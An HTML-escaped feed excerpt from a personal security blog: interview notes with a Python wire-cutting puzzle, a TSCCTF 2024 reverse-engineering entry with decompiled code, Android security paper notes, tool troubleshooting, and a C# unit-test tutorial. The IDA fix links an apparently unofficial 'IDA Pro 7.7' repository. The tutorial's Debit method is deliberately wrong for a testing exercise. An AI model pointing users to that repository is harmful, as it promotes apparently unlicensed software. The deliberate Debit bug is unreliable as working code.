&lt;/li>
&lt;li>
&lt;p>緊接著沒記錯的話就是問一些比較和資安專業的問題(這一個階段是在不上網Google的情況之下以自己本身的經驗和知識回答)，我記得的題目有&lt;/p>
&lt;ol>
&lt;li>什麼是Mitre ATT&amp;amp;CK&lt;/li>
&lt;li>SOC團隊主要是幹嘛的&lt;/li>
&lt;li>有沒有什麼特別印象深刻的APT攻擊&lt;/li>
&lt;li>什麼是IDS、IPS、EDR、MDR&lt;/li>
&lt;/ol>
&lt;p>最後一題答的非常不好，應該說我之前有接觸過但真的一時忘記的，所以就只能交給ddaa幫忙改正我的答案，這邊再寫一次好了，以免忘記&lt;/p>
&lt;ol>
&lt;li>IDS(Intrusion Detection System, 入侵偵測系統)
從名字就可以看的出來，他是針對流入流出的各種封包的偵測系統，也就是獨立於Firewall的旁之，如果他有檢測到封包內有什麼異常的Payload或是pattern，就會跳出告警，但就僅只於此，不會再做更多的操作&lt;/li>
&lt;li>IPS(Intrusion Prevention System, 入侵防禦系統)
IPS就是要改進上述的問題，他主打的就是偵測到快快的東西就會主動的防禦掉，但這樣還是有一個問題，現今的攻擊手法越來越多種，而且有時候是那種可以包裝成安全落地的形式，必須要在本地端監控才有辦法知道&lt;/li>
&lt;li>EDR(Endpoint Detection and Response, 端點偵測與應對)
EDR就是在做這樣的事情，可是有可能會有一個疑問，每個人的主機內不是都有安裝那種傳統的Windows Defenders或是小紅傘那種東西，為什麼還需要有EDR，其實現今的攻擊手法已經有很大的變化，有可能單純看個人的裝置會看不出個所以然，必須要聯合其他的裝置一起做關聯性的比對才會知道目前是不是正在遭受攻擊，所以EDR強大的地方在於他做到各個裝置endpoint端點的串聯，讓資安事件的偵測和防禦可以更嚴謹，這也是中小型企業最需要的資安產品&lt;/li>
&lt;li>MDR(Managed Detection and Response, 受管式偵測與應對)
這東西其實就是一個EDR+SOC的服務衍生的產品，但ddaa說這個東西要做出市場區隔可能還沒有到太創新&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>(1HR)緊接著就是人生第一次的白板題，題目敘述如下:
有一個遊戲，規則是有一個炸彈，炸彈上有好幾條線，每一條線都有三個特徵，我必須根據這三個特徵判斷文氏圖並且決定要不要剪斷這一條線，文氏圖如下，這是我從網路上找到最像題幹的圖片
&lt;img src="https://hackmd.io/_uploads/HkQnldw6p.png" alt="venndiagram" />
剛剛講到每一條線的三個特徵分別是: 線的一端連接的LED有沒有亮、該條線的顏色(是否為紅或藍或非藍也非紅或是同時是藍也是紅)、線的另外一端有無標示星號，依照上圖來說，A區域就是有無星號、B區域是LED有無亮、C區域是線是紅色、D區域是線是藍色，所以假設現在有一線的三個特徵是有LED、有星號且是紅色，則我們應該要圈A、B和C，最後的交集就是44和32，當然當時的題目不是這些數字，他是有代號的，共有五個C、D、S、P、B，分別代表:
C: 無條件剪斷線
D: 暫時先不要剪斷，根據搭配到的其他代號(S、P、B)進行後續驗證
S: 如果炸彈的序列號為偶數則剪斷線
P: 如果炸彈有Port號也要剪斷線
B: 如果炸彈的電池有兩個以上也要剪斷線&lt;/p>
&lt;p>總結一下上述的問題:
Input: 線的三個特徵(LED亮暗或閃爍、線的顏色、有無星號)以及炸彈的三個特徵(序列號、電池數量、Port號)
Output: 根據以上的狀態判段該條線要不要剪斷&lt;/p>
&lt;p>以下附上我的Source Code:
:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">try:
 led_light = input(&amp;#34;LED Light Or Not Or Flashing (Y/N/F): &amp;#34;).upper()
 assert led_light == &amp;#34;Y&amp;#34; or led_light == &amp;#34;N&amp;#34; or led_light == &amp;#34;F&amp;#34;
 if led_light == &amp;#34;F&amp;#34;:
 led_light = &amp;#34;N&amp;#34;
 star_or_not = input(&amp;#34;Star Or Not (Y/N): &amp;#34;).upper()
 assert star_or_not == &amp;#34;Y&amp;#34; or star_or_not == &amp;#34;N&amp;#34;
 cable_color = input(&amp;#34;Cable Color (R/B): &amp;#34;).upper()
 assert cable_color == &amp;#34;R&amp;#34; or cable_color == &amp;#34;B&amp;#34;
 bomb_feature_serial = int(input(&amp;#34;Bomb Feature Serial (number): &amp;#34;))
 assert bomb_feature_serial &amp;gt;= 0
 bomb_feature_port = int(input(&amp;#34;Bomb Feature Port (number): &amp;#34;))
 assert bomb_feature_port &amp;gt;= 0
 bomb_feature_battery_num = int(input(&amp;#34;Bomb Feature Battery Number (number): &amp;#34;))
 assert bomb_feature_battery_num &amp;gt;= 0
except ValueError:
 print(&amp;#34;Please input the correct value&amp;#34;)
 exit()

def judge_venn_diagram(led_light, star_or_not, cable_color):

 if led_light == &amp;#34;Y&amp;#34;:
 if star_or_not == &amp;#34;Y&amp;#34;:
 if cable_color == &amp;#34;R&amp;#34;:
 return &amp;#34;D&amp;#34;, &amp;#34;B&amp;#34;
 elif cable_color == &amp;#34;B&amp;#34;:
 return &amp;#34;D&amp;#34;, &amp;#34;P&amp;#34;
 else:
 if cable_color == &amp;#34;R&amp;#34;:
 return &amp;#34;B&amp;#34;, &amp;#34;S&amp;#34;
 elif cable_color == &amp;#34;B&amp;#34;:
 return &amp;#34;P&amp;#34;, &amp;#34;S&amp;#34;
 elif led_light == &amp;#34;N&amp;#34;:
 if star_or_not == &amp;#34;Y&amp;#34;:
 if cable_color == &amp;#34;R&amp;#34;:
 return &amp;#34;C&amp;#34;, &amp;#34;P&amp;#34;
 elif cable_color == &amp;#34;B&amp;#34;:
 return &amp;#34;P&amp;#34;, &amp;#34;D&amp;#34;
 else:
 return &amp;#34;S&amp;#34;, &amp;#34;D&amp;#34;

def judge_digit(digit):
 if &amp;#34;D&amp;#34; in digit:
 if &amp;#34;S&amp;#34; in digit:
 return judge_bomb_feature_serial(bomb_feature_serial)
 elif &amp;#34;P&amp;#34; in digit:
 if bomb_feature_port:
 return True
 else:
 return False
 elif &amp;#34;B&amp;#34; in digit:
 return judge_bomb_feature_battery_num(bomb_feature_battery_num)

 elif &amp;#34;C&amp;#34; in digit:
 return True

def judge_bomb_feature_battery_num(bomb_feature_battery_num):
 if bomb_feature_battery_num &amp;gt;= 2:
 return True
 return False

def judge_bomb_feature_serial(bomb_feature_serial):
 if bomb_feature_serial % 2 == 0:
 return True
 return False

def main():
 print(&amp;#34;Start Game&amp;#34;)
 num1, num2 = judge_venn_diagram(led_light, star_or_not, cable_color)

 if judge_digit([num1, num2]):
 print(&amp;#34;Cut&amp;#34;)
 else:
 print(&amp;#34;Don&amp;#39;t Cut&amp;#34;) 


if __name__ == &amp;#34;__main__&amp;#34;:
 main()
&lt;/code>&lt;/pre>&lt;p>:::
當時是依照CodePilot和ChatGPT生出一些關鍵的語法再加上我自己的邏輯寫出來的，其實這一題算是簡單，我的留程是先借由線的三個特徵判斷文氏圖會圈出哪兩個字母(每一次一定都會圈出兩個字母，且C和D這兩個互斥的情況不會出現，一定是C或是D搭配SPB其中一個字母)
:::info
這邊要特別再說明一下，如果是閃爍就視為暗，如果LED沒有亮就代表我在圈文氏圖的時候要用排斥的角度看他，舉例來說如果LED沒亮、但是有星號且線為紅色，B圈到的部分就不能算，所以以上圖來說就會是420和432這兩個數字，如果是LED沒亮也沒有星號且線為紅色，則圈出來的部分就是1058和485這兩個數字，不知道這樣的說明夠不夠清楚
:::
總之，這個階段就需要不斷的和面試官來回詢問和溝通Spec的要求，我問了超多問題，例如: 閃爍的時候算不算一個新的狀態因為原本的Spec上沒有提到，結果ddaa說當成暗；剛開始的時候也對這個題目很矇，想說到底在衝三小，所以我直接問有沒有什麼是比較好的方式可以判斷文氏圖圈出哪些字母，ddaa說可以直接用if-else判斷就好，這也讓我有個底，如果只是利用到if-else，那題目應該不會很難，至少我是個會把問題複雜化的人，所以我在寫的時候就直接用最暴力的方式，就用巢狀if-else判斷所有狀態；我還問了上面特別提到的問題，如果特徵是否定的情況要怎麼處理，其實也就是要用排除的方式看待他等等問題，最後的結論是有寫出來，方向也大致上和ddaa預想的差不多，只是有一些小陷阱和可以改進的地方&lt;/p></description></item><item><title>TSCCTF 2024</title><link>https://bernie6401.github.io/docs/security/competition/tscctf-2024/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/tscctf-2024/</guid><description>&lt;h1 id="tscctf-2024">
 TSCCTF 2024
 &lt;a class="anchor" href="#tscctf-2024">#&lt;/a>
&lt;/h1>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BJLmu63Y6.png" alt="image" />&lt;/p>
&lt;h2 id="misc">
 Misc
 &lt;a class="anchor" href="#misc">#&lt;/a>
&lt;/h2>
&lt;h3 id="aka">
 AKA
 &lt;a class="anchor" href="#aka">#&lt;/a>
&lt;/h3>
&lt;h4 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler IDA&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">__int64 flag_function()
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]

 num_of_files = 0;
 sub_14000A6C0();
 here_dll = LoadLibraryA(&amp;#34;here.dll&amp;#34;);
 flag_dll = LoadLibraryA(&amp;#34;flag.dll&amp;#34;);
 ghost_dll = LoadLibraryA(&amp;#34;ghost.dll&amp;#34;);
 strcpy(FileName, &amp;#34;.\\*.*&amp;#34;);
 FirstFileA = FindFirstFileA(FileName, &amp;amp;FindFileData);
 while ( FindNextFileA(FirstFileA, &amp;amp;FindFileData) )
 {
 while ( *(_WORD *)FindFileData.cFileName != 46
 &amp;amp;&amp;amp; (*(_WORD *)FindFileData.cFileName != 11822 || FindFileData.cFileName[2]) )
 {
 num_of_files += (GetFileAttributesA(FindFileData.cFileName) &amp;amp; 0x10) == 0;
 if ( !FindNextFileA(FirstFileA, &amp;amp;FindFileData) )
 goto LABEL_6;
 }
 }
LABEL_6:
 FindClose(FirstFileA);
 if ( num_of_files &amp;gt; 2 )
 {
 v6 = strcpy(buf, &amp;#34;We don&amp;#39;t want too many files here.&amp;#34;);
 puts(v6);
 v7 = strcpy(buf, &amp;#34;Files &amp;lt;= 2. You have &amp;#34;);
 v8 = (char *)sub_140071880(v7, (unsigned int)num_of_files);
 v9 = strcpy(v8, &amp;#34; file(s).&amp;#34;);
 puts(v9);
 v10 = strcpy(buf, &amp;#34;Hint: Did you have short name?&amp;#34;);
 puts(v10);
 return 0i64;
 }
 if ( !here_dll )
 {
 if ( !ghost_dll )
 {
 if ( !flag_dll )
 {
 v12 = strcpy(buf, &amp;#34;DLL load failed.&amp;#34;);
 puts(v12);
 goto LABEL_12;
 }
 hint = (void (*)(void))GetProcAddress(flag_dll, &amp;#34;hint&amp;#34;);
 if ( !hint )
 goto LABEL_12;
 goto LABEL_11;
 }
 goto LABEL_16;
 }
 if ( ghost_dll )
 {
LABEL_16:
 hint = (void (*)(void))GetProcAddress(ghost_dll, &amp;#34;Roflcopter&amp;#34;);
 if ( !hint )
 goto LABEL_12;
 goto LABEL_11;
 }
 if ( !flag_dll )
 {
 hint = (void (*)(void))GetProcAddress(here_dll, &amp;#34;hint&amp;#34;);
 if ( !hint )
 {
LABEL_12:
 FreeLibrary(here_dll);
 FreeLibrary(flag_dll);
 FreeLibrary(ghost_dll);
 return 0i64;
 }
LABEL_11:
 hint();
 goto LABEL_12;
 }
 flag = (void (*)(void))GetProcAddress(flag_dll, &amp;#34;flag&amp;#34;);
 if ( flag )
 flag();
 return 0i64;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>UiAutomatorViewer 常見問題整理</title><link>https://bernie6401.github.io/docs/problem-solutions/uiautomatorviewer-%E5%B8%B8%E8%A6%8B%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/uiautomatorviewer-%E5%B8%B8%E8%A6%8B%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/</guid><description>&lt;h1 id="uiautomatorviewer-常見問題整理">
 UiAutomatorViewer 常見問題整理
 &lt;a class="anchor" href="#uiautomatorviewer-%e5%b8%b8%e8%a6%8b%e5%95%8f%e9%a1%8c%e6%95%b4%e7%90%86">#&lt;/a>
&lt;/h1>
&lt;h2 id="java版本不相容">
 Java版本不相容
 &lt;a class="anchor" href="#java%e7%89%88%e6%9c%ac%e4%b8%8d%e7%9b%b8%e5%ae%b9">#&lt;/a>
&lt;/h2>
&lt;p>參考來源1: &lt;a href="https://khemlall-mangal.medium.com/setting-up-appium-configuration-on-windows-mac-efbc4d4a7bc3">Setting up Appium configuration on windows / Mac&lt;/a>
參考來源2: &lt;a href="https://blog.csdn.net/zyself/article/details/124084171">uiautomatorviewer閃退、提示Could not create the Java Virtual Machine等問題的處理&lt;/a>&lt;/p>
&lt;p>如果電腦安裝的JAVA version不是JAVA 8的話，有極高的機率會出錯，但又不想要覆蓋掉自己原本安裝的latest version，那參考來源1這個forum可以滿足這樣的事情&lt;/p>
&lt;ol>
&lt;li>下載JAVA 8並安裝 - 參考&lt;a href="https://blog.csdn.net/JunLeon/article/details/122623465">(超詳細）2022年最新版java 8（jdk1.8u321）安裝教程&lt;/a>
Official Link: &lt;a href="https://www.oracle.com/java/technologies/downloads/#java8-windows">https://www.oracle.com/java/technologies/downloads/#java8-windows&lt;/a>&lt;/li>
&lt;li>下載完UiAutomatorViewer之後直接改內部的bat file
&lt;ol>
&lt;li>Open &lt;code>uiautomatorviewer.bat&lt;/code> with editor by the path - &lt;code>%USERPROFILE%\AppData\Local\Android\Sdk\tools\bin\uiautomatorviewer.bat&lt;/code>&lt;/li>
&lt;li>搜尋&lt;code>set java_exe=&lt;/code>並且設定成comment，再更新如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ set java_exe&lt;span style="color:#f92672">=&lt;/span>C:&lt;span style="color:#ae81ff">\P&lt;/span>rogram Files&lt;span style="color:#ae81ff">\J&lt;/span>ava&lt;span style="color:#ae81ff">\j&lt;/span>dk-1.8&lt;span style="color:#ae81ff">\b&lt;/span>in&lt;span style="color:#ae81ff">\j&lt;/span>ava.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img src="https://hackmd.io/_uploads/BktkRCFcR.png" alt="圖片" />&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h2 id="error-while-obtaining-ui-hierarchy-xml-file-comandroidddmlibsyncexception-remote-object-doesnt-exist">
 Error while obtaining UI hierarchy XML file: com.android.ddmlib.SyncException: Remote object doesn&amp;rsquo;t exist!
 &lt;a class="anchor" href="#error-while-obtaining-ui-hierarchy-xml-file-comandroidddmlibsyncexception-remote-object-doesnt-exist">#&lt;/a>
&lt;/h2>
&lt;p>這個的解決方案有很多，我是在使用Spotify的時候出現這個問題，解決的方案是第一個
參考來源1: &lt;a href="https://blog.csdn.net/YiLiuF/article/details/109601968">CSDN - adb常用命令&lt;/a>
參考來源2: &lt;a href="https://www.cnblogs.com/lilip/p/11089713.html">cnblogs - 【Android】【問題解決記錄】Error obtaining UI hierarchy :Error while obtaining UI hierarchy XML file: com.android.ddmlib.SyncException: Remote object doesn&amp;rsquo;t exist!&lt;/a>
參考來源3: &lt;a href="https://stackoverflow.com/questions/40214342/error-obtaining-ui-hierarchy-error-while-obtaining-ui-hierarchy-xml-file-com-an">StackOverflow - Error obtaining UI hierarchy Error while obtaining UI hierarchy XML file: com.android.ddmlib.SyncException: Remote object doesn&amp;rsquo;t exist&lt;/a>
參考來源4: &lt;a href="https://blog.csdn.net/weixin_39230341/article/details/90598944">CSDN - Error while obtaining UI hierarchy XML file: com.android.ddmlib.SyncExceptio解決方法&lt;/a>
參考來源5: &lt;a href="https://blog.csdn.net/suncanshine/article/details/124546419">uiautomatorviewer報錯：Remote object doesn‘t exist Error while obtaining UI hierarchy XML file&lt;/a>&lt;/p></description></item><item><title>Uncovering Intent based Leak of Sensitive Data in Android Framework</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/uncovering-intent-based-leak-of-sensitive-data-in-android-framework/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/uncovering-intent-based-leak-of-sensitive-data-in-android-framework/</guid><description>&lt;h1 id="uncovering-intent-based-leak-of-sensitive-data-in-android-framework">
 Uncovering Intent based Leak of Sensitive Data in Android Framework
 &lt;a class="anchor" href="#uncovering-intent-based-leak-of-sensitive-data-in-android-framework">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-meeting-paper-ntu">
 tags: &lt;code>Meeting Paper&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-meeting-paper-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::info
Zhou, H., Luo, X., Wang, H., &amp;amp; Cai, H. (2022, November). Uncovering Intent based Leak of Sensitive Data in Android Framework. In Proceedings of the 2022 ACM SIGSAC Conference on Computer and Communications Security (pp. 3239-3252).
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;a href="https://ironglion.com/archives/334">[Android] Activity基本介紹&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>
&lt;p>什麼是Activity?
Activity是App中，提供畫面的一個元件，
例如：使用Google地圖App時，顯示地圖的那個畫面。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>只有Activity可以顯示畫面嗎？
不是，除了Activity以外還有其他元件可以顯示畫面，
例如：Dialog，但每一個App至少要有一個Activity，但這有個例外，如果這個App不提供介面的話也是可以不用有Activity的。&lt;/p>
&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;hr>
&lt;blockquote>
&lt;p>Activity其他注意事項&lt;/p>
&lt;ul>
&lt;li>兩個Activity傳遞資訊是透過Intent
&lt;pre tabindex="0">&lt;code class="language-kotlin!" data-lang="kotlin!">Intent intent = new Intent(this, TwoActivity.class);
startActivity(intent);
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Intent 能傳遞的資訊大小要小於512k&lt;/li>
&lt;li>每一個Activity都要在AndroidManifest中聲明
&lt;pre tabindex="0">&lt;code class="language-kotlin!" data-lang="kotlin!">&amp;lt;manifest ... &amp;gt;
 &amp;lt;application ... &amp;gt;
 &amp;lt;activity android:name=&amp;#34;.MainActivity&amp;#34; /&amp;gt;
 ...
 &amp;lt;/application ... &amp;gt;
 ...
&amp;lt;/manifest &amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;p>:::&lt;/p></description></item><item><title>Understanding Real-world Threats to Deep Learning Models in Android Apps</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/understanding-real-world-threats-to-deep-learning-models-in-android-apps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/understanding-real-world-threats-to-deep-learning-models-in-android-apps/</guid><description>&lt;h1 id="understanding-real-world-threats-to-deep-learning-models-in-android-apps">
 Understanding Real-world Threats to Deep Learning Models in Android Apps
 &lt;a class="anchor" href="#understanding-real-world-threats-to-deep-learning-models-in-android-apps">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-meeting-paper-ntu">
 tags: &lt;code>Meeting Paper&lt;/code> &lt;code>NTU&lt;/code>
 &lt;a class="anchor" href="#tags-meeting-paper-ntu">#&lt;/a>
&lt;/h6>
&lt;p>:::info
Deng, Z., Chen, K., Meng, G., Zhang, X., Xu, K., &amp;amp; Cheng, Y. (2022, November). Understanding real-world threats to deep learning models in android apps. In Proceedings of the 2022 ACM SIGSAC Conference on Computer and Communications Security (pp. 785-799).
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;a href="https://medium.com/trustableai/%E9%87%9D%E5%B0%8D%E6%A9%9F%E5%99%A8%E5%AD%B8%E7%BF%92%E7%9A%84%E6%83%A1%E6%84%8F%E8%B3%87%E6%96%99%E6%94%BB%E6%93%8A-%E4%B8%80-e94987742767">What is Adversarial Example? - 運用對抗例攻擊深度學習模型&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>所謂對抗例，是一種刻意製造的、讓機器學習模型判斷錯誤的輸入資料。最早是 Szegedy et al（2013）發現對於用 ImageNet、AlexNet 等資料集訓練出來的影像辨識模型，常常只需要輸入端的微小的變動，就可以讓輸出結果有大幅度的改變。例如取一張卡車的照片，可以被模型正確辨識，但只要改變影像中的少數像素，就可以讓模型辨識錯誤，而且前後對影像的改變非常少，對肉眼而言根本分不出差異。
:::&lt;/p></description></item><item><title>Unexpected fatal error while initializing python runtime.</title><link>https://bernie6401.github.io/docs/problem-solutions/unexpected-fatal-error-while-initializing-python-runtime_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/unexpected-fatal-error-while-initializing-python-runtime_/</guid><description>&lt;h1 id="unexpected-fatal-error-while-initializing-python-runtime">
 Unexpected fatal error while initializing python runtime.
 &lt;a class="anchor" href="#unexpected-fatal-error-while-initializing-python-runtime">#&lt;/a>
&lt;/h1>
&lt;p>Complete error message: Unexpected fatal error while initializing python runtime. Please run idapyswitch to confirm or change the used Python runtime&lt;/p>
&lt;h2 id="solution">
 Solution
 &lt;a class="anchor" href="#solution">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://zhuanlan.zhihu.com/p/434575474">IDA出错unexpected fatal error while intitailizing python runtime.&lt;/a>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>只要在使用者變數增加&lt;code>PYTHON:C:\Users\berni\anaconda3\envs\NTUCNS\&lt;/code>
&lt;img src="https://hackmd.io/_uploads/r1aVq-su2.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>在增加環境變數&lt;code>C:\Users\berni\anaconda3\envs\NTUCNS\Lib&lt;/code>
&lt;img src="https://hackmd.io/_uploads/Hkkv5bs_2.png" alt="" />&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Note: ==但這樣的情況會變成VSCode的terminal沒辦法使用conda的command，而一般的CMD或是WSL不受影響==&lt;/p>
&lt;h2 id="ida-pro-77">
 IDA Pro 7.7
 &lt;a class="anchor" href="#ida-pro-77">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/751643992/IDA_Pro_7.7">IDA Pro 7.7&lt;/a>&lt;/p>
&lt;h2 id="other-reference">
 Other Reference
 &lt;a class="anchor" href="#other-reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.csdn.net/tbk345/article/details/124163684">IDA免安裝版沒有python執行功能&lt;/a>
&lt;a href="https://blog.csdn.net/weixin_45055269/article/details/105940348">IDA7.0的脚本语言：idc和idapython&lt;/a>&lt;/p></description></item><item><title>Unit Test Practice</title><link>https://bernie6401.github.io/docs/security/course/ntu-st/unit-test-practice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-st/unit-test-practice/</guid><description>&lt;h1 id="unit-test-practice">
 Unit Test Practice
 &lt;a class="anchor" href="#unit-test-practice">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_st-software-testing">
 tags: &lt;code>NTU_ST&lt;/code> &lt;code>Software Testing&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_st-software-testing">#&lt;/a>
&lt;/h6>
&lt;p>:::spoiler Click to open TOC
[TOC]
:::&lt;/p>
&lt;h2 id="install-the-environment">
 Install the environment
 &lt;a class="anchor" href="#install-the-environment">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Install Visual Studio with .NET that we can use C# language to implement unit test properly.&lt;img src="https://imgur.com/VwMKdZM.png" alt="install c#" />&lt;/li>
&lt;/ul>
&lt;h2 id="create-a-project-to-test">
 Create a project to test
 &lt;a class="anchor" href="#create-a-project-to-test">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Create a new project and choose C# as your language and named the project &lt;strong>Bank&lt;/strong>.&lt;img src="https://imgur.com/bPDga9p.png" alt="create project" />&lt;/li>
&lt;li>Rename Program.cs as BankAccount.cs and replace all content by the following code.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c#" data-lang="c#">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">using&lt;/span> System;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">namespace&lt;/span> BankAccountNS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">BankAccount&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">readonly&lt;/span> &lt;span style="color:#66d9ef">string&lt;/span> m_customerName;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">double&lt;/span> m_balance;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> BankAccount() { }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> BankAccount(&lt;span style="color:#66d9ef">string&lt;/span> customerName, &lt;span style="color:#66d9ef">double&lt;/span> balance)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m_customerName = customerName;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m_balance = balance;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">string&lt;/span> CustomerName
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">get&lt;/span> { &lt;span style="color:#66d9ef">return&lt;/span> m_customerName; }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">double&lt;/span> Balance
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">get&lt;/span> { &lt;span style="color:#66d9ef">return&lt;/span> m_balance; }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> Debit(&lt;span style="color:#66d9ef">double&lt;/span> amount)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;gt; m_balance)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (amount &amp;lt; &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArgumentOutOfRangeException(&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m_balance += amount; &lt;span style="color:#75715e">// intentionally incorrect code&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
